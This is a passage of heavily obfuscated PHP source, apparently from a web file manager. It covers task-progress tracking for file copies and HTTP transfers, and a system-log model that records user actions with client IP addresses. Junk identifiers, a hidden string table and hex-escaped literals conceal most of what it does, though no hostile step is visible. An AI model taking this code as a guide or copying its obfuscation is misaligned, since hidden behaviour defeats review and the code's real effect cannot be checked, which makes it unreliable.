$ÕËæ²¶ì[$¾ôí©í›[1842]] / $ÕËæ²¶ì[$¾ôí©í›[839]]; if ($ÕËæ²¶ì[$¾ôí©í›[1785]] > 0) { $šôÂ ò = timeFloat() - $ÕËæ²¶ì[$¾ôí©í›[1787]] - $ÕËæ²¶ì[$¾ôí©í›[1790]]; $ÕËæ²¶ì[$¾ôí©í›[1791]] = $šôÂ ò * (1 - $ÕËæ²¶ì[$¾ôí©í›[1785]]) / $ÕËæ²¶ì[$¾ôí©í›[1785]]; } } public function addPath($Î·¬à¬œ) { $³ÂÔ¹Í =& $_SERVER[†ûãı«°]; if (!$Î·¬à¬œ) { return; } $Ş·éÛ =& $this->task; $©–€ºîè = IO::infoWithChildren($Î·¬à¬œ); $åÎ»‡ÉÑ = $Ş·éÛ[$³ÂÔ¹Í[1846]] ? $Ş·éÛ[$³ÂÔ¹Í[1846]][$³ÂÔ¹Í[1847]] : 0; $Ş·éÛ[$³ÂÔ¹Í[1846]] = array($³ÂÔ¹Í[1847] => $åÎ»‡ÉÑ + 1, $³ÂÔ¹Í[496] => $©–€ºîè[$³ÂÔ¹Í[32]], $³ÂÔ¹Í[87] => $©–€ºîè[$³ÂÔ¹Í[87]], $³ÂÔ¹Í[586] => $©–€ºîè[$³ÂÔ¹Í[586]] ? $©–€ºîè[$³ÂÔ¹Í[586]] : $©–€ºîè[$³ÂÔ¹Í[87]]); if ($©–€ºîè[$³ÂÔ¹Í[33]] == $³ÂÔ¹Í[232]) { $Ş·éÛ[$³ÂÔ¹Í[1151]] += 1; } else { $Ş·éÛ[$³ÂÔ¹Í[1151]] += $©–€ºîè[$³ÂÔ¹Í[82]][$³ÂÔ¹Í[80]]; if ($©–€ºîè[$³ÂÔ¹Í[193]]) { $Ş·éÛ[$³ÂÔ¹Í[1151]] += $©–€ºîè[$³ÂÔ¹Í[82]][$³ÂÔ¹Í[81]] + 1; } } $Ş·éÛ[$³ÂÔ¹Í[839]] += $©–€ºîè[$³ÂÔ¹Í[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ºÑÄ¼Ó‘) { } public function sourceAddHashEnd($éÎ‡•¤ ) { } public function sourceAddFileStart($“Ş°Ÿ¿’) { $• ó­İÔ =& $_SERVER[†ûãı«°]; $Í÷ŒÙé =& $this->task; $Í÷ŒÙé[$• ó­İÔ[1837]] = $“Ş°Ÿ¿’[$• ó­İÔ[79]]; $Í÷ŒÙé[$• ó­İÔ[1835]] = $“Ş°Ÿ¿’[$• ó­İÔ[32]]; $Í÷ŒÙé[$• ó­İÔ[1153]] = $“Ş°Ÿ¿’[$• ó­İÔ[32]]; $Í÷ŒÙé[$• ó­İÔ[1848]] = $“Ş°Ÿ¿’[$• ó­İÔ[87]]; $this->update(); } public function sourceAddFileEnd($ô„ßÆõŠ) { $û¹‚Éœî =& $_SERVER[†ûãı«°]; $¯ÕÄ‚Õ =& $this->task; $¯ÕÄ‚Õ[$û¹‚Éœî[1842]] += $ô„ßÆõŠ[$û¹‚Éœî[79]]; $¯ÕÄ‚Õ[$û¹‚Éœî[1848]] = $ô„ßÆõŠ[$û¹‚Éœî[87]]; $this->update(1); } public function copyFileStart($™˜¢Ôâ§, $Û±—¶Îé, $ÍøÖ‡é€, $‡™‹Œšü, $†—“àÇ«, $Õ¿½ı§Ñ) { $µ“±şø© =& $_SERVER[†ûãı«°]; $ºŞãõÁÊ = $†—“àÇ«; if ($ºŞãõÁÊ == $GLOBALS[$µ“±şø©[1849]]) { $ºŞãõÁÊ = $GLOBALS[$µ“±şø©[1850]]; } $GLOBALS[$µ“±şø©[1850]] = $†—“àÇ«; $GLOBALS[$µ“±şø©[1849]] = $Õ¿½ı§Ñ; $ò‰£¸ =& $this->task; $ò‰£¸[$µ“±şø©[1835]] = $ºŞãõÁÊ; $ò‰£¸[$µ“±şø©[1837]] = (int) $™˜¢Ôâ§->size($Û±—¶Îé); $ò‰£¸[$µ“±şø©[1838]] = 0; $ò‰£¸[$µ“±şø©[1153]] = $µ“±şø©[12]; $ò‰£¸[$µ“±şø©[1839]] = $µ“±şø©[12]; $ò‰£¸[$µ“±şø©[1840]] = 0; $Ñ²ÙÛ§î = $ò‰£¸[$µ“±şø©[1837]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ò‰£¸[$µ“±şø©[477]] . $µ“±şø©[1851]); if ($Ñ²ÙÛ§î && file_exists(get_path_father($‡™‹Œšü))) { Cache::set($ò‰£¸[$µ“±şø©[477]] . $µ“±şø©[1851], $‡™‹Œšü); $ò‰£¸[$µ“±şø©[1808]] = array($µ“±şø©[1852], $µ“±şø©[1853]); } $this->update(0, $Ñ²ÙÛ§î); } public static function updateCopyLocalFileSize($·ß­ «„) { $Î¿ÄÄ½… =& $_SERVER[†ûãı«°]; $¬Å¤ÑöË = Cache::get($·ß­ «„[$Î¿ÄÄ½…[477]] . $Î¿ÄÄ½…[1851]); if (!$¬Å¤ÑöË || !file_exists($¬Å¤ÑöË)) { return $·ß­ «„; } $·ß­ «„[$Î¿ÄÄ½…[1838]] = @filesize($¬Å¤ÑöË); $·ß­ «„[$Î¿ÄÄ½…[1842]] += $·ß­ «„[$Î¿ÄÄ½…[1838]]; self::updateTask($·ß­ «„); return $·ß­ «„; } public function copyFileEnd($½ÌÇò³², $“ó˜‰Æ, $Óò×ÓÇÆ, $ëÕêàö, $ÏÓÇñÃ˜, $ƒò¨ ŸÏ) { $ †¹ã¹ =& $_SERVER[†ûãı«°]; $š÷‚öÍß =& $this->task; $š÷‚öÍß[$ †¹ã¹[1838]] = $š÷‚öÍß[$ †¹ã¹[1837]]; $š÷‚öÍß[$ †¹ã¹[1839]] = $ †¹ã¹[12]; unset($š÷‚öÍß[$ †¹ã¹[1808]]); if ($ÏÓÇñÃ˜ == $š÷‚öÍß[$ †¹ã¹[1835]]) { $š÷‚öÍß[$ †¹ã¹[1841]] += $š÷‚öÍß[$ †¹ã¹[1837]]; $š÷‚öÍß[$ †¹ã¹[1842]] = $š÷‚öÍß[$ †¹ã¹[1841]]; $‹«ÇÅ¸ã = 1; if (isset($š÷‚öÍß[$ †¹ã¹[1848]]) && $š÷‚öÍß[$ †¹ã¹[1848]] == $“ó˜‰Æ) { $‹«ÇÅ¸ã = 0; } $this->update($‹«ÇÅ¸ã); } else { $this->update(); $š÷‚öÍß[$ †¹ã¹[1838]] = 0; } Cache::remove($š÷‚öÍß[$ †¹ã¹[477]] . $ †¹ã¹[1851]); self::log($ †¹ã¹[1854] . $“ó˜‰Æ . $ †¹ã¹[73] . $ëÕêàö . $ †¹ã¹[287] . $ÏÓÇñÃ˜ . $ †¹ã¹[1855] . $š÷‚öÍß[$ †¹ã¹[1835]]); } public function updateFileEnd($¢‰ºšÇ¦, $¹ª¾ğ“) { $øèÜÛÇ¤ =& $_SERVER[†ûãı«°]; $Ùšù‹ÜÍ =& $this->task; $Ùšù‹ÜÍ[$øèÜÛÇ¤[1835]] = $¢‰ºšÇ¦; $Ùšù‹ÜÍ[$øèÜÛÇ¤[1837]] = $¹ª¾ğ“; $Ùšù‹ÜÍ[$øèÜÛÇ¤[1841]] += $¹ª¾ğ“; $Ùšù‹ÜÍ[$øèÜÛÇ¤[1842]] = $Ùšù‹ÜÍ[$øèÜÛÇ¤[1841]]; $this->update(1); self::log($øèÜÛÇ¤[1856] . $¢‰ºšÇ¦); } public function sourceModelCopy($÷§øö”) { $‚óèŠ› =& $_SERVER[†ûãı«°]; $ş›õğ” = $÷§øö”[0]; $ê®°”ÔŸ = $÷§øö”[1]; $‰‹âŒ€è =& $this->task; $this->sourceModelCopyFlag = !0; $€î÷î‚ú = 0; switch ($ş›õğ”) { case $‚óèŠ›[642]: $€î÷î‚ú = 1; break; case $‚óèŠ›[645]: $‰‹âŒ€è[$‚óèŠ›[1835]] = $ê®°”ÔŸ[$‚óèŠ›[32]]; break; case $‚óèŠ›[647]: $€î÷î‚ú = intval($÷§øö”[$‚óèŠ›[458]] * 0.4); break; case $‚óèŠ›[649]: $€î÷î‚ú = intval($÷§øö”[$‚óèŠ›[458]] * 0.2); break; case $‚óèŠ›[651]: $€î÷î‚ú = intval($÷§øö”[$‚óèŠ›[458]] * 0.4); break; } $this->update($€î÷î‚ú); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ñ„ÀÔÖõ, $Ÿ‹ñ¥) { $¤áæãŞ =& $_SERVER[†ûãı«°]; $this->sourceModelCopyFlag = !0; $ªìÕñ = 1; if (isset($ñ„ÀÔÖõ[$¤áæãŞ[82]])) { $ªìÕñ = $ñ„ÀÔÖõ[$¤áæãŞ[82]][$¤áæãŞ[80]]; $ªìÕñ = $ªìÕñ + $ñ„ÀÔÖõ[$¤áæãŞ[82]][$¤áæãŞ[81]] + 1; } $this->update($ªìÕñ); $this->sourceModelCopyFlag = !1; } public function sourceMove($±”ò­á¯) { $this->sourceRemove($±”ò­á¯, !1); } public function curlProgress($£øìé¯, $êØ µ÷, $Û‚·­Òû, $ÆÌ†õ¤, $¾áõŠè±) { $‰ó•§ê• =& $_SERVER[†ûãı«°]; $‚Ãá‡ŸÓ =& $this->task; if ($¾áõŠè± > 0) { $‚Ãá‡ŸÓ[$‰ó•§ê•[1153]] = $‰ó•§ê•[1857]; $‚Ãá‡ŸÓ[$‰ó•§ê•[1839]] = $‰ó•§ê•[110]; if ($‚Ãá‡ŸÓ[$‰ó•§ê•[1837]]) { $‚Ãá‡ŸÓ[$‰ó•§ê•[1838]] = $¾áõŠè±; } if ($‚Ãá‡ŸÓ[$‰ó•§ê•[1840]]) { $‚Ãá‡ŸÓ[$‰ó•§ê•[1838]] = $¾áõŠè± + $‚Ãá‡ŸÓ[$‰ó•§ê•[1840]]; } } else { if ($Û‚·­Òû > 0) { if ($‚Ãá‡ŸÓ[$‰ó•§ê•[1837]] == $êØ µ÷) { $‚Ãá‡ŸÓ[$‰ó•§ê•[1838]] = $Û‚·­Òû; $‚Ãá‡ŸÓ[$‰ó•§ê•[1153]] = $‰ó•§ê•[1858]; $‚Ãá‡ŸÓ[$‰ó•§ê•[1839]] = $‰ó•§ê•[1290]; } } } $this->update(); } public function curlProgressStart($ß˜Ÿ•ıŸ) { } public function curlProgressEnd($æœå–´») { $§ºÓ÷ûş =& $_SERVER[†ûãı«°]; $ì¿î€ü =& $this->task; $ôÆÄÂ±Ú = curl_getinfo($æœå–´»); $Ô™¨üë = $ôÆÄÂ±Ú[$§ºÓ÷ûş[1859]]; if ($Ô™¨üë == -1) { $Ô™¨üë = $ôÆÄÂ±Ú[$§ºÓ÷ûş[1860]]; } if ($ì¿î€ü[$§ºÓ÷ûş[1839]] == $§ºÓ÷ûş[110] && $Ô™¨üë) { $ì¿î€ü[$§ºÓ÷ûş[1840]] += $Ô™¨üë; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $åÒşÒïâ =& $_SERVER[†ûãı«°]; $·‡ÚÕ÷œ =& $this->task; $·‡ÚÕ÷œ[$åÒşÒïâ[1861]] = 1; Hook::bind($åÒşÒïâ[1829], array($this, $åÒşÒïâ[1862])); Hook::bind($åÒşÒïâ[1831], array($this, $åÒşÒïâ[1863])); Hook::bind($åÒşÒïâ[1833], array($this, $åÒşÒïâ[1864])); } protected function endAfter() { $±Òâ·®Ç =& $_SERVER[†ûãı«°]; Hook::unbind($±Òâ·®Ç[1829], array($this, $±Òâ·®Ç[1862])); Hook::unbind($±Òâ·®Ç[1831], array($this, $±Òâ·®Ç[1863])); Hook::unbind($±Òâ·®Ç[1833], array($this, $±Òâ·®Ç[1864])); } public function progressStart($ĞÓ«í‰ç) { $ŒáŸÏ¸ =& $_SERVER[†ûãı«°]; $à¼Åıß“ = curl_getinfo($ĞÓ«í‰ç); self::log($ŒáŸÏ¸[1865] . $à¼Åıß“[$ŒáŸÏ¸[384]]); self::valueSet($this->task[$ŒáŸÏ¸[477]], $this->task); } public function progressEnd($úÅº­¶) { $Üø´‘„Ã =& $_SERVER[†ûãı«°]; self::log($Üø´‘„Ã[1866] . $this->task[$Üø´‘„Ã[477]]); $this->end(); } public function progress($ÒÄ£È±, $şÊÜÖ´é, $³¤£øúÚ, $àğ¿€Œƒ, $åëëÚ¯¼) { $ëºÓ°ßæ =& $_SERVER[†ûãı«°]; $¤÷ßëõº =& $this->task; if ($åëëÚ¯¼ > 0) { $¤÷ßëõº[$ëºÓ°ßæ[1151]] = $¤÷ßëõº[$ëºÓ°ßæ[1151]] == 0 ? $àğ¿€Œƒ : $¤÷ßëõº[$ëºÓ°ßæ[1151]]; $¤÷ßëõº[$ëºÓ°ßæ[1784]] = $åëëÚ¯¼; } else { if ($³¤£øúÚ > 0) { $¤÷ßëõº[$ëºÓ°ßæ[1151]] = $¤÷ßëõº[$ëºÓ°ßæ[1151]] == 0 ? $şÊÜÖ´é : $¤÷ßëõº[$ëºÓ°ßæ[1151]]; $¤÷ßëõº[$ëºÓ°ßæ[1784]] = $³¤£øúÚ; } } $this->update(); self::log("\x70\x72\157\147\162\145\x73\x73\x48\x74\x74\x70\x3a\144\x6f\x77\x6e\72{$³¤£øúÚ}\57{$şÊÜÖ´é}\x3b\x20\x75\160\154\157\x61\x64\x3a{$åëëÚ¯¼}\57{$àğ¿€Œƒ}\x3b"); } } goto EÓÅ…èˆËÓ; C´ß’”Êç: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\155\137\154\157\x67"; protected $dataAuto = array(array("\143\x72\x65\141\x74\145\x54\151\155\145", "\x74\x69\155\145", "\x69\156\163\x65\162\x74", "\x66\x75\x6e\x63\164\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $‘¼Õ·«Š =& $_SERVER[†ûãı«°]; return array($‘¼Õ·«Š[2358] => LNG($‘¼Õ·«Š[2359]), $‘¼Õ·«Š[2360] => LNG($‘¼Õ·«Š[2361]), $‘¼Õ·«Š[1926] => LNG($‘¼Õ·«Š[2362]), $‘¼Õ·«Š[2363] => LNG($‘¼Õ·«Š[2364]), $‘¼Õ·«Š[2365] => LNG($‘¼Õ·«Š[2366]), $‘¼Õ·«Š[2367] => LNG($‘¼Õ·«Š[2368]), $‘¼Õ·«Š[2369] => LNG($‘¼Õ·«Š[2370]), $‘¼Õ·«Š[1956] => LNG($‘¼Õ·«Š[2370]), $‘¼Õ·«Š[1957] => LNG($‘¼Õ·«Š[2371]), $‘¼Õ·«Š[2372] => LNG($‘¼Õ·«Š[2373]), $‘¼Õ·«Š[2374] => LNG($‘¼Õ·«Š[2375]), $‘¼Õ·«Š[2376] => LNG($‘¼Õ·«Š[2377]), $‘¼Õ·«Š[2378] => LNG($‘¼Õ·«Š[2379]), $‘¼Õ·«Š[1954] => LNG($‘¼Õ·«Š[2380]), $‘¼Õ·«Š[2381] => LNG($‘¼Õ·«Š[2382]), $‘¼Õ·«Š[1961] => LNG($‘¼Õ·«Š[2383]), $‘¼Õ·«Š[2384] => LNG($‘¼Õ·«Š[2385]), $‘¼Õ·«Š[2386] => LNG($‘¼Õ·«Š[2387]), $‘¼Õ·«Š[2388] => LNG($‘¼Õ·«Š[2389]), $‘¼Õ·«Š[2390] => LNG($‘¼Õ·«Š[2391]), $‘¼Õ·«Š[1964] => LNG($‘¼Õ·«Š[2392]), $‘¼Õ·«Š[1965] => LNG($‘¼Õ·«Š[2393]), $‘¼Õ·«Š[2394] => LNG($‘¼Õ·«Š[2395]), $‘¼Õ·«Š[2396] => LNG($‘¼Õ·«Š[2397]), $‘¼Õ·«Š[2398] => LNG($‘¼Õ·«Š[2399]), $‘¼Õ·«Š[1959] => LNG($‘¼Õ·«Š[2400]), $‘¼Õ·«Š[2401] => LNG($‘¼Õ·«Š[2402]), $‘¼Õ·«Š[1958] => LNG($‘¼Õ·«Š[2403]), $‘¼Õ·«Š[2404] => LNG($‘¼Õ·«Š[2405]), $‘¼Õ·«Š[2406] => LNG($‘¼Õ·«Š[2407]), $‘¼Õ·«Š[2408] => LNG($‘¼Õ·«Š[2407]), $‘¼Õ·«Š[2409] => LNG($‘¼Õ·«Š[2410]), $‘¼Õ·«Š[2411] => LNG($‘¼Õ·«Š[2411]), $‘¼Õ·«Š[2412] => LNG($‘¼Õ·«Š[1930]), $‘¼Õ·«Š[2413] => LNG($‘¼Õ·«Š[2414]), $‘¼Õ·«Š[2415] => LNG($‘¼Õ·«Š[2416]), $‘¼Õ·«Š[2417] => LNG($‘¼Õ·«Š[2418]), $‘¼Õ·«Š[2419] => LNG($‘¼Õ·«Š[2420]), $‘¼Õ·«Š[2421] => LNG($‘¼Õ·«Š[2422]), $‘¼Õ·«Š[2423] => LNG($‘¼Õ·«Š[2423]), $‘¼Õ·«Š[2424] => LNG($‘¼Õ·«Š[2425]), $‘¼Õ·«Š[2426] => LNG($‘¼Õ·«Š[2427]), $‘¼Õ·«Š[2428] => LNG($‘¼Õ·«Š[2429]), $‘¼Õ·«Š[2430] => LNG($‘¼Õ·«Š[2431]), $‘¼Õ·«Š[2432] => LNG($‘¼Õ·«Š[2433]), $‘¼Õ·«Š[2434] => LNG($‘¼Õ·«Š[2435]), $‘¼Õ·«Š[212] => LNG($‘¼Õ·«Š[212]), $‘¼Õ·«Š[213] => LNG($‘¼Õ·«Š[2436]), $‘¼Õ·«Š[2437] => LNG($‘¼Õ·«Š[2437])); } private function typeFile() { $¥–İşÜ  =& $_SERVER[†ûãı«°]; $²ˆ©ùšÈ = array($¥–İşÜ [1961] => array($¥–İşÜ [1962]), $¥–İşÜ [2376] => array($¥–İşÜ [2438]), $¥–İşÜ [2378] => array($¥–İşÜ [2439]), $¥–İşÜ [1954] => array($¥–İşÜ [1955], $¥–İşÜ [2440]), $¥–İşÜ [2386] => array(), $¥–İşÜ [2388] => array(), $¥–İşÜ [2390] => array(), $¥–İşÜ [1964] => array($¥–İşÜ [1966]), $¥–İşÜ [1965] => array($¥–İşÜ [1966]), $¥–İşÜ [2394] => array($¥–İşÜ [2441]), $¥–İşÜ [2396] => array($¥–İşÜ [2441]), $¥–İşÜ [2398] => array($¥–İşÜ [2442]), $¥–İşÜ [2384] => array($¥–İşÜ [2443]), $¥–İşÜ [1959] => array($¥–İşÜ [2444]), $¥–İşÜ [2401] => array($¥–İşÜ [2445]), $¥–İşÜ [1958] => array($¥–İşÜ [1960])); return $²ˆ©ùšÈ; } private function typeAll() { $ÈÑ£ã«¨ =& $_SERVER[†ûãı«°]; $œêœáÚë = $this->typeList; $¹¹î²Åó = array_filter($this->typeFile()); foreach ($¹¹î²Åó as $€¬•ŸÛ => $í·ûæŞû) { $œêœáÚë[$í·ûæŞû[0]] = $œêœáÚë[$€¬•ŸÛ]; } $œêœáÚë[$ÈÑ£ã«¨[1966]] = LNG($ÈÑ£ã«¨[2446]); $œêœáÚë[$ÈÑ£ã«¨[2441]] = LNG($ÈÑ£ã«¨[2447]); return $œêœáÚë; } public function addLog($ç»é”¨©, $Ñº´ÑÏù = array()) { $ïôúÒ² =& $_SERVER[†ûãı«°]; if (!isset($this->typeList[$ç»é”¨©])) { return; } $°äÍİâ“ = Session::get($ïôúÒ²[2125]); if (!$°äÍİâ“) { $°äÍİâ“ = _get($Ñº´ÑÏù, $ïôúÒ²[1783], 0); } if ($ç»é”¨© == $ïôúÒ²[2413] && is_array($Ñº´ÑÏù[$ïôúÒ²[2448]]) && !$Ñº´ÑÏù[$ïôúÒ²[2448]]) { return; } $¹ä—à²Ü = get_client_ip(); if (!$Ñº´ÑÏù || strlen(json_encode($Ñº´ÑÏù)) >= 1024 * 64) { if ($Ñº´ÑÏù && is_array($Ñº´ÑÏù)) { $Ñº´ÑÏù = array_intersect_key($Ñº´ÑÏù, array_flip($ïôúÒ²[477], $ïôúÒ²[32])); $Ñº´ÑÏù[$ïôúÒ²[2449]] = $¹ä—à²Ü; } else { $Ñº´ÑÏù = array($ïôúÒ²[2449] => $¹ä—à²Ü); } } else { if (is_array($Ñº´ÑÏù)) { $Ñº´ÑÏù[$ïôúÒ²[2449]] = $¹ä—à²Ü; } else { $Ñº´ÑÏù = array($ïôúÒ²[1298] => $Ñº´ÑÏù, $ïôúÒ²[2449] => $¹ä—à²Ü); } } $Ñº´ÑÏù = array($ïôúÒ²[1773] => Session::sign(), $ïôúÒ²[1774] => intval($°äÍİâ“), $ïôúÒ²[33] => $ç»é”¨©, $ïôúÒ²[1776] => json_encode($Ñº´ÑÏù)); return parent::add($Ñº´ÑÏù); } public function remove($Îß‹½³¸) { $this->where(array($_SERVER[†ûãı«°][495] => $Îß‹½³¸))->delete(); } private function _makeOrder($á©×¾Ò¶ = '') { $œÎ±¡ĞÏ =& $_SERVER[†ûãı«°]; $©Á®Éï‚ = $œÎ±¡ĞÏ[233]; $€¦ŒÍ†š = array($œÎ±¡ĞÏ[525] => $œÎ±¡ĞÏ[526], $œÎ±¡ĞÏ[527] => $œÎ±¡ĞÏ[528]); $¾ÌÑ¾ = Input::get($œÎ±¡ĞÏ[533], $œÎ±¡ĞÏ[7], $œÎ±¡ĞÏ[2165], array($œÎ±¡ĞÏ[2079], $œÎ±¡ĞÏ[527])); $¾ÌÑ¾ = $€¦ŒÍ†š[$¾ÌÑ¾]; $á©×¾Ò¶ = $á©×¾Ò¶ . "{$©Á®Éï‚}\x20{$¾ÌÑ¾}"; return $this->order($á©×¾Ò¶); } public function get($é’›—ú¬ = '') { $ôÏ´›Ë™ =& $_SERVER[†ûãı«°]; if (!$é’›—ú¬) { show_json(array()); } $§¥µ—¹û = array(); if ($é’›—ú¬[$ôÏ´›Ë™[1783]]) { $§¥µ—¹û[$ôÏ´›Ë™[1783]] = $é’›—ú¬[$ôÏ´›Ë™[1783]]; } if (isset($é’›—ú¬[$ôÏ´›Ë™[836]])) { $–äì²ó— = $é’›—ú¬[$ôÏ´›Ë™[836]]; $â¤ªœÒ« = isset($é’›—ú¬[$ôÏ´›Ë™[837]]) ? $é’›—ú¬[$ôÏ´›Ë™[837]] : time(); $§¥µ—¹û[$ôÏ´›Ë™[233]] = array($ôÏ´›Ë™[410], array($–äì²ó—, $â¤ªœÒ«)); } if ($é’›—ú¬[$ôÏ´›Ë™[33]]) { $Èõ™á¥Î = explode($ôÏ´›Ë™[50], $é’›—ú¬[$ôÏ´›Ë™[33]]); $¦¥ôíÍ = $this->typeFile(); $Ç¬‚¶ˆş = array(); foreach ($Èõ™á¥Î as $Ÿı”ÄŸ‹) { $Ç¬‚¶ˆş[] = $Ÿı”ÄŸ‹; if (isset($¦¥ôíÍ[$Ÿı”ÄŸ‹])) { $Ç¬‚¶ˆş = array_merge($Ç¬‚¶ˆş, $¦¥ôíÍ[$Ÿı”ÄŸ‹]); } } $Ç¬‚¶ˆş = array_unique($Ç¬‚¶ˆş); if ($Ç¬‚¶ˆş) { $§¥µ—¹û[$ôÏ´›Ë™[33]] = array($ôÏ´›Ë™[7], $Ç¬‚¶ˆş); } } else { $§¥µ—¹û[$ôÏ´›Ë™[33]] = array($ôÏ´›Ë™[2450], $ôÏ´›Ë™[2451]); } if (!empty($é’›—ú¬[$ôÏ´›Ë™[2449]])) { $§¥µ—¹û[$ôÏ´›Ë™[528]] = array($ôÏ´›Ë™[461], "\x25{$é’›—ú¬[$ôÏ´›Ë™[2449]]}\x25"); } $¬å³Ú = $this->_makeOrder()->where($§¥µ—¹û)->selectPage(); if (empty($¬å³Ú[$ôÏ´›Ë™[447]])) { show_json(array(), !0, $¬å³Ú[$ôÏ´›Ë™[444]]); } $¬å³Ú[$ôÏ´›Ë™[447]] = $this->logList($¬å³Ú[$ôÏ´›Ë™[447]]); return $¬å³Ú; } private function ipAddress(&$ÅùÜÉå) { $ü¶ÓëŸ =& $_SERVER[†ûãı«°]; if (!empty($ÅùÜÉå[$ü¶ÓëŸ[2449]])) { $ş÷Ìå¶« = IpLocation::get($ÅùÜÉå[$ü¶ÓëŸ[2449]]); } else { $ş÷Ìå¶« = LNG($ü¶ÓëŸ[2452]); } $ÅùÜÉå[$ü¶ÓëŸ[2453]] = $ş÷Ìå¶«; } private function descZipDownload($¡â»ßÕ³, &$ï®ÃÒÁ€) { $™­¡ÁÕ… =& $_SERVER[†ûãı«°]; if (!isset($¡â»ßÕ³[$™­¡ÁÕ…[2454]])) { return; } $ôòÃÖğ = json_decode($¡â»ßÕ³[$™­¡ÁÕ…[2454]], !0); foreach ($ôòÃÖğ as $¾¸ç€Ö‡) { try { $ƒğ¡˜ÄÏ = IO::infoFullSimple($¾¸ç€Ö‡[$™­¡ÁÕ…[87]]); } catch (Exception $²ç¾éš¿) { continue; } $¡â»ßÕ³[$™­¡ÁÕ…[87]] = $¾¸ç€Ö‡[$™­¡ÁÕ…[87]]; $ï®ÃÒÁ€[] = $¡â»ßÕ³[$™­¡ÁÕ…[193]] = $ƒğ¡˜ÄÏ[$™­¡ÁÕ…[193]]; $ï®ÃÒÁ€[] = $¡â»ßÕ³[$™­¡ÁÕ…[2221]] = $ƒğ¡˜ÄÏ[$™­¡ÁÕ…[192]]; break; } return $¡â»ßÕ³; } private function getSourceList(&$Ñ×´Ğ…) { $²÷áı³¦ =& $_SERVER[†ûãı«°]; $‹ø„Œï = array(); foreach ($Ñ×´Ğ… as $ßèï†˜Ñ => $©ê¿›ìò) { $‡µÉ´ì‰ = json_decode($©ê¿›ìò[$²÷áı³¦[528]], !0); if ($©ê¿›ìò[$²÷áı³¦[33]] == $²÷áı³¦[1957]) { $‡µÉ´ì‰ = $this->descZipDownload($‡µÉ´ì‰, $‹ø„Œï); $Ñ×´Ğ…[$ßèï†˜Ñ][$²÷áı³¦[528]] = json_encode($‡µÉ´ì‰); continue; } if (strpos($©ê¿›ìò[$²÷áı³¦[33]], $²÷áı³¦[2223]) !== 0) { if (!isset($‡µÉ´ì‰[$²÷áı³¦[87]]) || strpos($©ê¿›ìò[$²÷áı³¦[33]], $²÷áı³¦[2455]) !== 0) { continue; } try { $¬‰Í“£ = IO::infoFullSimple($‡µÉ´ì‰[$²÷áı³¦[87]]); } catch (Exception $îöãŸû¡) { continue; } $‹ø„Œï[] = $‡µÉ´ì‰[$²÷áı³¦[193]] = $¬‰Í“£[$²÷áı³¦[193]]; $‹ø„Œï[] = $‡µÉ´ì‰[$²÷áı³¦[2221]] = $¬‰Í“£[$²÷áı³¦[192]]; $Ñ×´Ğ…[$ßèï†˜Ñ][$²÷áı³¦[528]] = json_encode($‡µÉ´ì‰); continue; } $‹ø„Œï[] = $‡µÉ´ì‰[$²÷áı³¦[193]]; $‹ø„Œï[] = $‡µÉ´ì‰[$²÷áı³¦[2221]]; if ($‡µÉ´ì‰[$²÷áı³¦[33]] == $²÷áı³¦[627]) { $‹ø„Œï[] = $‡µÉ´ì‰[$²÷áı³¦[528]][$²÷áı³¦[1252]]; $‹ø„Œï[] = $‡µÉ´ì‰[$²÷áı³¦[528]][$²÷áı³¦[1253]]; } if ($‡µÉ´ì‰[$²÷áı³¦[33]] == $²÷áı³¦[2232]) { $‹ø„Œï[] = $‡µÉ´ì‰[$²÷áı³¦[528]][$²÷áı³¦[193]]; } } if (!$‹ø„Œï) { return array(); } return Model($²÷áı³¦[906])->sourceListInfo($‹ø„Œï, !0); } private function logList($ñ·ÇÍ—›) { $ŸæÏ–í“ =& $_SERVER[†ûãı«°]; $÷Ï•ò÷š = array_to_keyvalue($ñ·ÇÍ—›, $ŸæÏ–í“[12], $ŸæÏ–í“[1783]); $ù©ÂÑ¸ = Model($ŸæÏ–í“[601])->userListInfo(array_unique($÷Ï•ò÷š)); $Ø È‹­è = $this->getSourceList($ñ·ÇÍ—›); $«™¸õ° = $this->typeAll(); $õ¥¯½Ë¨ = array(); $î†É¸ëÊ = array(); foreach ($ñ·ÇÍ—› as $Ì ƒ¦Ô¾ => $éÑûÃıŞ) { $õ±…ë¶À = $éÑûÃıŞ[$ŸæÏ–í“[33]]; $”Ä–Ìä = isset($ù©ÂÑ¸[$éÑûÃıŞ[$ŸæÏ–í“[1783]]]) ? $ù©ÂÑ¸[$éÑûÃıŞ[$ŸæÏ–í“[1783]]] : !1; $¹¸È…óó = strpos($õ±…ë¶À, $ŸæÏ–í“[2456]) === 0 ? LNG($ŸæÏ–í“[2457]) : LNG($ŸæÏ–í“[2452]); $éÑûÃıŞ[$ŸæÏ–í“[32]] = isset($”Ä–Ìä[$ŸæÏ–í“[32]]) ? $”Ä–Ìä[$ŸæÏ–í“[32]] : LNG($ŸæÏ–í“[2452]); $éÑûÃıŞ[$ŸæÏ–í“[2283]] = isset($”Ä–Ìä[$ŸæÏ–í“[2283]]) ? $”Ä–Ìä[$ŸæÏ–í“[2283]] : $ŸæÏ–í“[12]; $éÑûÃıŞ[$ŸæÏ–í“[1671]] = isset($«™¸õ°[$õ±…ë¶À]) ? $«™¸õ°[$õ±…ë¶À] : $¹¸È…óó; $éÑûÃıŞ[$ŸæÏ–í“[2164]] = $”Ä–Ìä; $™ó‰ò – = json_decode($éÑûÃıŞ[$ŸæÏ–í“[528]], !0); $éÑûÃıŞ[$ŸæÏ–í“[2449]] = isset($™ó‰ò –[$ŸæÏ–í“[2449]]) ? $™ó‰ò –[$ŸæÏ–í“[2449]] : $ŸæÏ–í“[12]; $éÑûÃıŞ[$ŸæÏ–í“[2453]] = IpLocation::get($éÑûÃıŞ[$ŸæÏ–í“[2449]]); if (strpos($õ±…ë¶À, $ŸæÏ–í“[2223]) === 0 || isset($™ó‰ò –[$ŸæÏ–í“[2221]])) { $™ó‰ò –[$ŸæÏ–í“[90]] = $Ø È‹­è[$™ó‰ò –[$ŸæÏ–í“[193]]]; $™ó‰ò –[$ŸæÏ–í“[2237]] = $Ø È‹­è[$™ó‰ò –[$ŸæÏ–í“[2221]]]; if 